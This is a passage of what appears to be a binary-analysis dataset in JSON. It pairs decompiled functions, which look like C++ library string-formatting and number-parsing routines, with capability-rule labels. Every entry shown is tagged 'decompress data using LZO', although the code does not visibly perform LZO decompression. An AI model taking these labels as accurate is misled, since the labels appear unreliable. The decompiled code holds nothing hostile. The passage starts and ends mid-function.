fcn.004b4da0(var_44h, 0, 0, 1);\n        }\n        *(var_48h + uVar15 * 2) = uVar3;\n        *(var_48h + uVar15 * 2 + 2) = 0;\n        var_44h = uVar2;\n        if (var_80h < 0) {\n            uVar15 = *(iVar11 + 0x3e);\n            uVar16 = 0;\n            uVar9 = -var_80h;\n            fcn.004b3350(uVar2, 0, uVar9, uVar15);\n            if (0x3fffffff - var_44h < uVar14) goto code_r0x00462cef;\n            fcn.004b4bc0(piVar12, uVar14);\n            goto code_r0x00462742;\n        }\n        if (*(iVar11 + 0x30) <= 0x3fffffff - uVar2) {\n            fcn.004b4bc0(piVar12 + var_80h, *(iVar11 + 0x30));\n            goto code_r0x00462742;\n        }\n        fcn.004be310(0x523fe4);\ncode_r0x00462cbb:\n        fcn.004be310(0x523fe4);\ncode_r0x00462cc7:\n        fcn.004be310(0x523fe4);\n        uVar15 = extraout_ECX;\n        uVar9 = extraout_EDX;\n    }\n    else {\n        if (iVar5 < 0) {\n            var_80h = uVar14;\n        }\n        if (*(iVar11 + 0xc) == 0) {\n            fcn.004b2b50(0, var_44h, piVar12, var_80h);\n            iVar5 = *(iVar11 + 0x30);\n            goto code_r0x0046273a;\n        }\n        fcn.004b3350(0, var_44h, var_80h * 2, 0);\n        puVar6 = fcn.004bd190(var_48h, *(iVar11 + 0x14), *(iVar11 + 8), *(iVar11 + 0xc), piVar12, piVar12 + var_80h);\n        uVar9 = puVar6 - var_48h >> 1;\n        uVar15 = var_44h;\n        if (uVar9 <= var_44h) {\n            *puVar6 = 0;\n            iVar5 = *(iVar11 + 0x30);\n            var_44h = uVar9;\n            goto code_r0x0046273a;\n        }\n    }\n    uVar16 = 0x524001;\n    fcn.004be900(0x524018, 0x524001);\ncode_r0x00462cef:\n    piVar7 = fcn.004be310(0x523fe4, uVar16, uVar9, uVar15);\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    uVar16 = fcn.0043a8e0(piVar7);\n    fcn.004c2e40(uVar16);\n    (**(*piVar7 + 4))();\n    do {\n        uVar16 = fcn.004c32d0();\n        fcn.004c2e40(uVar16);\n    } while( true );\n}\n",
        "token_count": 3137
    },
    "00462d60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl fcn.00462d60(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int16_t **arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ushort uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    ushort *puVar6;\n    int32_t *piVar7;\n    uint32_t extraout_ECX;\n    bool bVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t extraout_EDX;\n    int32_t iVar11;\n    int16_t *piVar12;\n    uint *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint uVar16;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    ushort *var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint8_t var_65h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    var_64h = arg_ch;\n    var_65h = arg_ch;\n    piVar4 = fcn.004c01c0(arg_10h + 0x6c);\n    iVar5 = fcn.00451af0();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar11 = *piVar7;\n    if (iVar11 == 0) {\n        puVar13 = fcn.004c2c70(0x54);\n        puVar13[1] = 0;\n        *puVar13 = 0x52c684;\n        puVar13[2] = 0;\n        puVar13[3] = 0;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 0x12) = 0;\n        puVar13[6] = 0;\n        puVar13[7] = 0;\n        puVar13[8] = 0;\n        puVar13[9] = 0;\n        puVar13[10] = 0;\n        puVar13[0xb] = 0;\n        puVar13[0xc] = 0;\n        puVar13[0xd] = 0;\n        puVar13[0xe] = 0;\n        *(puVar13 + 0x52) = 0;\n        fcn.004ab010(arg_10h + 0x6c);\n        fcn.004ad130(puVar13, iVar5);\n        iVar11 = *piVar7;\n    }\n    piVar12 = *arg_18h;\n    if (*piVar12 == *(iVar11 + 0x3c)) {\n        var_4ch = *(iVar11 + 0x38);\n        var_78h = *(iVar11 + 0x28);\n        var_70h = *(iVar11 + 0x2c);\n        if (arg_18h[1] != NULL) {\n            piVar12 = piVar12 + 1;\n        }\n    }\n    else {\n        var_4ch = *(iVar11 + 0x34);\n        var_70h = *(iVar11 + 0x24);\n        var_78h = *(iVar11 + 0x20);\n    }\n    iVar5 = (**(*piVar4 + 0x14))(8, piVar12, piVar12 + arg_18h[1]);\n    uVar14 = iVar5 - piVar12 >> 1;\n    if (uVar14 == 0) goto code_r0x00462e07;\n    var_48h = &var_40h;\n    var_40h = var_40h._2_2_ << 0x10;\n    var_44h = 0;\n    fcn.004b4a30(iVar5 - piVar12);\n    iVar5 = *(iVar11 + 0x30);\n    var_80h = uVar14 - iVar5;\n    if (var_80h < 1) {\ncode_r0x00462f1a:\n        uVar15 = var_44h;\n        if (iVar5 < 1) {\ncode_r0x00462f22:\n            uVar15 = var_44h + var_70h;\n            uVar14 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar15 = uVar15 + *(iVar11 + 0x1c);\n            }\n            var_30h = &var_28h;\n            var_2ch = 0;\n            var_28h = var_28h & 0xffff0000;\n            fcn.004b4a30(uVar15 * 2);\n            puVar13 = &var_4ch;\n            uVar9 = *(arg_10h + 8);\n            bVar8 = uVar14 == 0x10 && uVar15 < uVar9;\n            do {\n                uVar2 = var_2ch;\n                if (*puVar13 < 5) {\n    // switch table (5 cases) at 0x524050\n                    switch(*puVar13) {\n                    case 0:\n                        if (bVar8) {\n                            fcn.004b3350(var_2ch, 0, uVar9 - uVar15, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar8) {\n                            fcn.004b3350(var_2ch, 0, uVar9 - uVar15, arg_14h);\n                        }\n                        else {\n                            uVar1 = var_2ch + 1;\n                            uVar10 = 7;\n                            if (var_30h != &var_28h) {\n                                uVar10 = var_28h;\n                            }\n                            if (uVar10 < uVar1) {\n                                fcn.004b4da0(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar2 * 2) = arg_14h;\n                            *(var_30h + uVar2 * 2 + 2) = 0;\n                            var_2ch = uVar1;\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            if (0x3fffffff - var_2ch < *(iVar11 + 0x1c)) goto code_r0x0046349b;\n                            fcn.004b4bc0(*(iVar11 + 0x18), *(iVar11 + 0x1c));\n                        }\n                        break;\n                    case 3:\n                        if (var_70h != 0) {\n                            uVar3 = *var_78h;\n                            uVar1 = var_2ch + 1;\n                            uVar10 = 7;\n                            if (var_30h != &var_28h) {\n                                uVar10 = var_28h;\n                            }\n                            if (uVar10 < uVar1) {\n                                fcn.004b4da0(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar2 * 2) = uVar3;\n                            *(var_30h + uVar2 * 2 + 2) = 0;\n                            var_2ch = uVar1;\n                        }\n                        break;\n                    case 4:\n                        fcn.004b4bc0(var_48h, var_44h);\n                    }\n                }\n                puVar13 = puVar13 + 1;\n            } while (&var_48h != puVar13);\n            var_74h = var_2ch;\n            if (1 < var_70h) {\n                if (0x3fffffff - var_2ch < var_70h - 1) goto code_r0x004634a7;\n                fcn.004b4bc0(var_78h + 1, var_70h - 1);\n                var_74h = var_2ch;\n            }\n            var_2ch = var_74h;\n            if (var_74h < uVar9) {\n                if (uVar14 == 0x20) {\n                    fcn.004b3350(var_74h, 0, uVar9 - var_74h, arg_14h);\n                    var_74h = uVar9;\n                }\n                else {\n                    fcn.004b3350(0, 0, uVar9 - var_74h, arg_14h);\n                    var_74h = uVar9;\n                }\n            }\n            if (var_65h == 0) {\n                uVar14 = (**(*arg_8h + 0x30))(var_30h, var_74h);\n                var_65h = uVar14 != var_74h;\n            }\n            var_64h = arg_ch & 0xffffff00;\n            if (var_30h != &var_28h) {\n                fcn.004c2c30(var_30h);\n            }\n            if (var_48h != &var_40h) {\n                fcn.004c2c30(var_48h);\n            }\ncode_r0x00462e07:\n            *(arg_10h + 8) = 0;\n            var_64h = var_64h & 0xffffff00 | var_65h;\n            return CONCAT44(var_64h, arg_8h);\n        }\n        uVar3 = *(iVar11 + 0x12);\n        uVar2 = var_44h + 1;\n        uVar9 = 7;\n        if (var_48h != &var_40h) {\n            uVar9 = var_40h;\n        }\n        if (uVar9 < uVar2) {\n            fcn.004b4da0(var_44h, 0, 0, 1);\n        }\n        *(var_48h + uVar15 * 2) = uVar3;\n        *(var_48h + uVar15 * 2 + 2) = 0;\n        var_44h = uVar2;\n        if (var_80h < 0) {\n            uVar15 = *(iVar11 + 0x3e);\n            uVar16 = 0;\n            uVar9 = -var_80h;\n            fcn.004b3350(uVar2, 0, uVar9, uVar15);\n            if (0x3fffffff - var_44h < uVar14) goto code_r0x004634cf;\n            fcn.004b4bc0(piVar12, uVar14);\n            goto code_r0x00462f22;\n        }\n        if (*(iVar11 + 0x30) <= 0x3fffffff - uVar2) {\n            fcn.004b4bc0(piVar12 + var_80h, *(iVar11 + 0x30));\n            goto code_r0x00462f22;\n        }\n        fcn.004be310(0x523fe4);\ncode_r0x0046349b:\n        fcn.004be310(0x523fe4);\ncode_r0x004634a7:\n        fcn.004be310(0x523fe4);\n        uVar15 = extraout_ECX;\n        uVar9 = extraout_EDX;\n    }\n    else {\n        if (iVar5 < 0) {\n            var_80h = uVar14;\n        }\n        if (*(iVar11 + 0xc) == 0) {\n            fcn.004b2b50(0, var_44h, piVar12, var_80h);\n            iVar5 = *(iVar11 + 0x30);\n            goto code_r0x00462f1a;\n        }\n        fcn.004b3350(0, var_44h, var_80h * 2, 0);\n        puVar6 = fcn.004bd190(var_48h, *(iVar11 + 0x14), *(iVar11 + 8), *(iVar11 + 0xc), piVar12, piVar12 + var_80h);\n        uVar9 = puVar6 - var_48h >> 1;\n        uVar15 = var_44h;\n        if (uVar9 <= var_44h) {\n            *puVar6 = 0;\n            iVar5 = *(iVar11 + 0x30);\n            var_44h = uVar9;\n            goto code_r0x00462f1a;\n        }\n    }\n    uVar16 = 0x524001;\n    fcn.004be900(0x524018, 0x524001);\ncode_r0x004634cf:\n    piVar7 = fcn.004be310(0x523fe4, uVar16, uVar9, uVar15);\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    uVar16 = fcn.0043a8e0(piVar7);\n    fcn.004c2e40(uVar16);\n    (**(*piVar7 + 4))();\n    do {\n        uVar16 = fcn.004c32d0();\n        fcn.004c2e40(uVar16);\n    } while( true );\n}\n",
        "token_count": 3144
    },
    "00463ce0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.00463ce0(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    iVar2 = fcn.0048b140(0, 0, &var_19h);\n    *in_ECX = iVar2;\n    iVar2 = fcn.0048b220(arg_ch, arg_10h, &var_19h, 0);\n    uVar6 = (arg_10h - arg_ch) * 2;\n    iVar5 = *(iVar2 + -0xc) + iVar2;\n    var_2ch = fcn.004c2c50(uVar6);\n    while( true ) {\n        uVar3 = fcn.00463cb0(var_2ch, iVar2, uVar6);\n        if (uVar6 <= uVar3) {\n            uVar6 = uVar3 + 1;\n            fcn.004c2c20(var_2ch);\n            var_2ch = fcn.004c2c50(uVar6);\n            uVar3 = fcn.00463cb0(var_2ch, iVar2, uVar6);\n        }\n        fcn.0048ba60(var_2ch, uVar3);\n        iVar4 = sub.msvcrt.dll_strlen(iVar2);\n        if (iVar5 == iVar2 + iVar4) break;\n        iVar1 = *in_ECX;\n        iVar2 = iVar2 + iVar4 + 1;\n        iVar4 = *(iVar1 + -0xc);\n        uVar3 = iVar4 + 1;\n        if ((*(iVar1 + -8) <= uVar3 && uVar3 != *(iVar1 + -8)) || (0 < *(iVar1 + -4))) {\n            fcn.0048c930(uVar3);\n        }\n        *(*in_ECX + *(*in_ECX + -0xc)) = 0;\n        iVar1 = *in_ECX;\n        *(iVar1 + -0xc) = uVar3;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + 1 + iVar4) = 0;\n    }\n    fcn.004c2c20(var_2ch);\n    fcn.0048b630(&var_19h);\n    return;\n}\n",
        "token_count": 618
    },
    "004640c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.004640c0(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *in_ECX;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar uVar9;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    iVar1 = fcn.00483230(0, 0, &var_19h);\n    *in_ECX = iVar1;\n    uVar9 = 0;\n    var_30h = arg_ch;\n    iVar2 = fcn.00483320(arg_ch, arg_10h, &var_19h, 0);\n    iVar1 = *(iVar2 + -0xc);\n    uVar7 = arg_10h - arg_ch;\n    if (0x3ffffffe < uVar7) {\ncode_r0x0046428e:\n        uVar5 = fcn.004c33a0(var_30h);\n        do {\n            fcn.004c2e40(uVar5);\n            uVar5 = fcn.004c32d0();\n        } while( true );\n    }\n    var_30h = fcn.004c2c50(uVar7 * 2);\n    iVar6 = iVar2;\n    do {\n        uVar8 = uVar7;\n        uVar3 = fcn.00464090(var_30h, iVar6, uVar7);\n        if (uVar7 <= uVar3) {\n            uVar7 = uVar3 + 1;\n            fcn.004c2c20();\n            if (0x3ffffffe < uVar7) {\n                fcn.004c33a0();\n                goto code_r0x0046428e;\n            }\n            var_30h = fcn.004c2c50();\n            uVar3 = fcn.00464090();\n        }\n        fcn.00483bd0(var_30h, uVar3, uVar8, uVar9, iVar2);\n        iVar4 = sub.msvcrt.dll_wcslen(iVar6);\n        iVar6 = iVar6 + iVar4 * 2;\n        if (iVar2 + iVar1 * 2 == iVar6) {\n            fcn.004c2c20(var_30h);\n            fcn.00483770(&var_19h);\n            return in_ECX;\n        }\n        iVar4 = *in_ECX;\n        iVar6 = iVar6 + 2;\n        uVar8 = *(iVar4 + -0xc) + 1;\n        if ((*(iVar4 + -8) <= uVar8 && uVar8 != *(iVar4 + -8)) || (0 < *(iVar4 + -4))) {\n            fcn.00484bb0(uVar8);\n        }\n        iVar4 = *in_ECX;\n        *(iVar4 + *(iVar4 + -0xc) * 2) = 0;\n        *(iVar4 + -4) = 0;\n        *(iVar4 + -0xc) = uVar8;\n        *(iVar4 + uVar8 * 2) = 0;\n    } while( true );\n}\n",
        "token_count": 800
    },
    "00464340": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00464340(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    bool bVar6;\n    bool bVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    char cVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar5 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0044da00(arg_18h + 0x6c);\n    uVar4 = *(iVar5 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 10,  uVar4 == 8)) {\n        uVar13 = 0x10;\n    }\n    bVar6 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar14 = arg_ch == 0xffffffff;\n    if (((bVar6) && (bVar14 = false,  arg_8h[3] <= arg_8h[2])) && (iVar5 = (**(*arg_8h + 0x24))(),  iVar5 == -1)) {\n        arg_8h = NULL;\n        bVar14 = bVar6;\n    }\n    bVar6 = arg_10h != NULL && arg_14h == -1;\n    var_44h._0_1_ = arg_14h == -1;\n    if ((bVar6) && (var_44h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar5 = (**(*arg_10h + 0x24))();\n        var_44h._0_1_ = false;\n        if (iVar5 == -1) {\n            arg_10h = NULL;\n            var_44h._0_1_ = bVar6;\n        }\n    }\n    if (var_44h == bVar14) {\n        bVar14 = false;\n        uVar12 = 0;\n        var_50h._3_1_ = 1;\n        var_44h = 0;\n        bVar6 = false;\n    }\n    else {\n        uVar12 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[3] <= arg_8h[2]) {\n                uVar12 = (**(*arg_8h + 0x24))();\n                if (uVar12 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar12 = 0xffffffff;\n                }\n                goto code_r0x004643d0;\n            }\n            uVar1 = *arg_8h[2];\n            uVar12 = uVar1;\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar1;\n            if (!bVar14) goto code_r0x004643e0;\ncode_r0x004643e9:\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != uVar12)) && (*(iVar3 + 0x24) != uVar12)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_50h._3_1_ = fcn.004502d0(&arg_10h);\n                var_44h = 0;\n                bVar6 = false;\n                if (var_50h._3_1_ != 0) goto code_r0x00464440;\n                uVar12 = fcn.00450370();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\ncode_r0x004643d0:\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar12;\n            if (bVar14) goto code_r0x004643e9;\ncode_r0x004643e0:\n            if (*(iVar3 + 0x4b) == uVar12) goto code_r0x004643e9;\n            bVar14 = false;\n        }\n        var_44h = 0;\n        bVar6 = false;\n        while (((cVar10 = uVar12,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10))) {\n            if (*(iVar3 + 0x4e) == cVar10) {\n                bVar7 = uVar13 == 10 | bVar6 ^ 1U;\n                if (!bVar7) goto code_r0x004645fa;\n                bVar6 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x0046462e;\n                }\n                var_44h = 0;\n                uVar13 = 8;\n                uVar11 = arg_8h[2];\n                if (arg_8h[3] <= uVar11) goto code_r0x004646d0;\ncode_r0x0046463d:\n                arg_8h[2] = uVar11 + 1;\ncode_r0x0046464a:\n                var_48h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar5 = (**(*arg_8h + 0x24))(),  iVar5 == -1)) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar6) break;\ncode_r0x004645fa:\n                if ((*(iVar3 + 0x4c) != cVar10) && (*(iVar3 + 0x4d) != cVar10)) {\n                    var_50h._3_1_ = 0;\n                    bVar6 = true;\n                    goto code_r0x00464440;\n                }\n                var_50h._3_1_ = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar6 = true;\n                    goto code_r0x0046444c;\n                }\n                var_44h = 0;\n                uVar13 = 0x10;\n                bVar7 = false;\ncode_r0x0046462e:\n                uVar11 = arg_8h[2];\n                bVar6 = bVar7;\n                if (uVar11 < arg_8h[3]) goto code_r0x0046463d;\ncode_r0x004646d0:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0046464a;\n                var_48h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar7 = arg_14h == -1;\n            if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar5 = (**(*arg_10h + 0x24))();\n                bVar7 = false;\n                if (iVar5 == -1) {\n                    arg_10h = NULL;\n                    bVar7 = bVar9;\n                }\n            }\n            if (var_48h._0_1_ == bVar7) {\n                var_50h._3_1_ = 1;\n                goto code_r0x00464440;\n            }\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar6) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_50h._3_1_ = 0;\n    }\ncode_r0x00464440:\n    var_4ch = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x0046444c:\n        var_4ch = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    uVar4 = 0xffffffff / uVar13;\n    var_50h._2_1_ = *(iVar3 + 100);\n    if (var_50h._2_1_ == 0) {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x004644a4:\n            cVar2 = uVar12;\n            iVar5 = cVar2;\n            if (var_4ch < 0xb) {\n                if ((cVar2 < '0') || (var_4ch + '0' <= cVar2)) goto code_r0x00464743;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x0046472c;\n            uVar12 = iVar5 - 0x30;\ncode_r0x004644c6:\n            if (uVar12 != 0xffffffff) {\n                do {\n                    if (uVar4 < var_48h) {\n                        var_50h._1_1_ = 1;\n                        uVar12 = arg_8h[2];\n                        if (arg_8h[3] <= uVar12) goto code_r0x004647d5;\ncode_r0x00464502:\n                        arg_8h[2] = uVar12 + 1;\ncode_r0x0046450f:\n                        var_50h._2_1_ = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar5 = (**(*arg_8h + 0x24))();\n                            var_50h._2_1_ = false;\n                            if (iVar5 == -1) {\n                                arg_8h = NULL;\n                                var_50h._2_1_ = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar11 = var_48h * uVar13;\n                        var_48h = uVar12 + uVar11;\n                        var_50h._1_1_ = var_50h._1_1_ | ~uVar12 < uVar11;\n                        uVar12 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar12 < arg_8h[3]) goto code_r0x00464502;\ncode_r0x004647d5:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046450f;\n                        var_50h._2_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar9 = arg_10h != NULL && arg_14h == -1;\n                    bVar7 = arg_14h == -1;\n                    if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar5 = (**(*arg_10h + 0x24))();\n                        bVar7 = false;\n                        if (iVar5 == -1) {\n                            arg_10h = NULL;\n                            bVar7 = bVar9;\n                        }\n                    }\n                    if (var_50h._2_1_ == bVar7) {\n                        var_50h._2_1_ = 1;\n                        goto code_r0x00464546;\n                    }\n                    uVar12 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x004644a4;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar12 = *arg_8h[2];\n                        goto code_r0x004644a4;\n                    }\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 != 0xffffffff) goto code_r0x004644a4;\n                    arg_8h = NULL;\n                    if (var_4ch < 0xb) break;\n                    cVar2 = -1;\n                    iVar5 = -1;\ncode_r0x0046472c:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x00464890;\n                    uVar12 = iVar5 - 0x57;\n                    if (uVar12 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x00464743;\n        }\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._1_1_ = 0;\n        var_50h._3_1_ = 0;\n        var_48h = 0;\n    }\n    else {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x004648fb:\n            uVar11 = var_2ch;\n            cVar2 = uVar12;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar5 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, var_4ch),  iVar5 == 0)) goto code_r0x00464743;\n                uVar12 = iVar5 - (iVar3 + 0x4e);\n                if (0xf < uVar12) {\n                    uVar12 = uVar12 - 6;\n                }\n                if (var_48h <= uVar4) {\n                    uVar11 = var_48h * uVar13;\n                    var_48h = uVar12 + uVar11;\n                    var_50h._1_1_ = var_50h._1_1_ | ~uVar12 < uVar11;\n                    var_44h = var_44h + 1;\n                    goto code_r0x00464962;\n                }\n                uVar12 = arg_8h[2];\n                var_50h._1_1_ = var_50h._2_1_;\n                if (arg_8h[3] <= uVar12) goto code_r0x004649c2;\ncode_r0x0046496d:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x0046497a:\n                var_5ch._0_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar5 = (**(*arg_8h + 0x24))();\n                    var_5ch._0_1_ = 0;\n                    if (iVar5 == -1) {\n                        arg_8h = NULL;\n                        var_5ch._0_1_ = var_50h._2_1_;\n                    }\n                }\n            }\n            else {\n                if (var_44h == 0) {\n                    var_50h._2_1_ = 0;\n                    var_50h._3_1_ = *(iVar3 + 0x10);\n                    goto code_r0x00464546;\n                }\n                uVar12 = var_2ch + 1;\n                uVar8 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar8 = var_28h;\n                }\n                if (uVar8 < uVar12) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                var_44h = 0;\n                *(stack0xffffffcc + uVar11) = var_44h;\n                *(stack0xffffffcc + uVar12) = 0;\n                var_2ch = uVar12;\ncode_r0x00464962:\n                uVar12 = arg_8h[2];\n                if (uVar12 < arg_8h[3]) goto code_r0x0046496d;\ncode_r0x004649c2:\n                (**(*arg_8h + 0x28))();\n                var_5ch._0_1_ = var_50h._2_1_;\n                if (arg_8h != NULL) goto code_r0x0046497a;\n            }\n            arg_ch = 0xffffffff;\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar7 = arg_14h == -1;\n            if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar5 = (**(*arg_10h + 0x24))();\n                bVar7 = false;\n                if (iVar5 == -1) {\n                    arg_10h = NULL;\n                    bVar7 = bVar9;\n                }\n            }\n            if (var_5ch == bVar7) goto code_r0x00464546;\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x004648fb;\n        }\n        var_48h = 0;\n        var_50h._1_1_ = 0;\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._3_1_ = 0;\n    }\ncode_r0x00464546:\n    if (var_2ch != 0) goto code_r0x00464752;\ncode_r0x0046454e:\n    if ((var_44h != 0) || (bVar6)) {\ncode_r0x00464797:\n        if (var_50h._3_1_ == 0) {\n            if (var_50h._1_1_ == 0) {\n                uVar4 = -var_48h;\n                if (!bVar14) {\n                    uVar4 = var_48h;\n                }\n                *arg_20h = uVar4;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00464575;\n        }\n    }\ncode_r0x00464563:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00464575:\n    if (var_50h._2_1_ != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00464890:\n    if (5 < cVar2 + 